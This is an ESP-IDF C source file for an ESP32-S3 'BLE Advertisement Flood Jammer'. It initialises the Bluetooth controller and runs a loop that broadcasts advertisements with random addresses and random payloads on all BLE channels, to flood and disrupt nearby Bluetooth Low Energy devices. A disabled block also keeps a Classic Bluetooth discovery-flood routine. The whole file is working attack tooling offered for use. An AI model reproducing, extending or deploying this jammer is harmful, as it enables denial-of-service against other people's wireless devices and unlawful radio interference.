/*
 * attack_bluetooth_jammer.c — BLE Advertisement Flood Jammer
 * 
 * ESP32-S3 native Bluetooth (2.4GHz)
 * 
 * BLE jamming: ACTIVE - floods BLE advertisements
 * Classic BT: PRESERVED as dead code (compiles but not executed)
 * 
 * Note: ESP32-S3 with ESP-IDF v5.x BT_CONTROLLER_INIT_CONFIG_DEFAULT()
 * must be assigned at declaration time, not reassigned.
 */

#include "attack_bluetooth_jammer.h"
#include "esp_rom_sys.h"
#include "esp_random.h"
#include "esp_bt.h"
#include <string.h>
#include <esp_log.h>
#include "esp_bt_main.h"
#include <esp_gap_ble_api.h>
#include "esp_bt_device.h"
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "BT_JAMMER";
static TaskHandle_t bt_jammer_task = NULL;
static volatile bool bt_jammer_running = false;
static volatile uint64_t bt_packets_sent = 0;

static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_NONCONN_IND,
    .channel_map        = ADV_CHNL_ALL,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ====================================================================
// CLASSIC BT CODE (DEAD CODE - preserved for reference)
// Compiled but never called. Kept for future ESP32 (not S3) use.
// ====================================================================
#if 0
static void classic_bt_inquiry_task(void *params) {
    // Classic BT inquiry/discovery flood
    // This code is for ESP32 classic (not S3 which has limited BT classic)
    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);
    while (bt_jammer_running) {
        esp_bt_gap_cancel_discovery();
        vTaskDelay(pdMS_TO_TICKS(5));
        esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 10, 0);
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    esp_bt_gap_cancel_discovery();
    vTaskDelete(NULL);
}
#endif
// ====================================================================

static void bt_jammer_task_func(void *pv) {
    bt_jammer_running = true;
    ESP_LOGI(TAG, "🔥 BLE Jammer started — flooding advertisements");

    uint8_t adv_data[31];

    while (bt_jammer_running) {
        memset(adv_data, 0, sizeof(adv_data));
        adv_data[0] = 0x02; adv_data[1] = 0x01; adv_data[2] = 0x06;
        adv_data[3] = 0x02; adv_data[4] = 0x0A;
        for (int i = 5; i < 31; i++) adv_data[i] = esp_random() & 0xFF;

        uint8_t rand_addr[6];
        for (int i = 0; i < 6; i++) rand_addr[i] = esp_random() & 0xFF;
        rand_addr[0] = (rand_addr[0] & 0xFE) | 0x02;
        esp_ble_gap_set_rand_addr(rand_addr);

        esp_ble_gap_config_adv_data_raw(adv_data, sizeof(adv_data));
        esp_ble_gap_start_advertising(&ble_adv_params);
        bt_packets_sent++;

        vTaskDelay(pdMS_TO_TICKS(10));
        esp_ble_gap_stop_advertising();
        vTaskDelay(pdMS_TO_TICKS(2));

        if (bt_packets_sent % 1000 == 0) {
            vTaskDelay(pdMS_TO_TICKS(5));
        }
    }

    esp_ble_gap_stop_advertising();
    
    ESP_LOGI(TAG, "BLE Jammer stopped. Packets: %llu", bt_packets_sent);
    bt_jammer_task = NULL;
    vTaskDelete(NULL);
}

void bt_jammer_start(void) {
    if (bt_jammer_running) return;
    
    esp_bt_controller_status_t bt_status = esp_bt_controller_get_status();
    
    if (bt_status == ESP_BT_CONTROLLER_STATUS_IDLE) {
        ESP_LOGI(TAG, "Initializing BT controller for BLE jammer...");
        
        esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        
        esp_err_t ret;
        ret = esp_bt_controller_init(&bt_cfg);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "BT controller init failed: %s", esp_err_to_name(ret));
            return;  // FIX: crash না হয়ে return করবে
        }
        
        ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "BT controller enable failed: %s", esp_err_to_name(ret));
            esp_bt_controller_deinit();
            return;
        }
        
        ret = esp_bluedroid_init();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Bluedroid init failed: %s", esp_err_to_name(ret));
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }
        
        ret = esp_bluedroid_enable();
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
            esp_bluedroid_deinit();
            esp_bt_controller_disable();
            esp_bt_controller_deinit();
            return;
        }
        
        ESP_LOGI(TAG, "BT controller initialized OK for BLE jammer");
    } else if (bt_status == ESP_BT_CONTROLLER_STATUS_ENABLED) {
        ESP_LOGI(TAG, "BT already enabled — reusing");
    } else {
        ESP_LOGW(TAG, "BT status = %d — may not work properly", bt_status);
    }
    
    xTaskCreatePinnedToCore(bt_jammer_task_func, "bt_jammer", 4096, NULL, 5, &bt_jammer_task, 1);
    ESP_LOGI(TAG, "BLE Jammer task created");
}

void bt_jammer_stop(void) {
    bt_jammer_running = false;
    if (bt_jammer_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        bt_jammer_task = NULL;
    }
    ESP_LOGI(TAG, "BLE Jammer stopped");
}

bool bt_jammer_is_running(void) { return bt_jammer_running; }
uint64_t bt_jammer_get_packets(void) { return bt_packets_sent; }
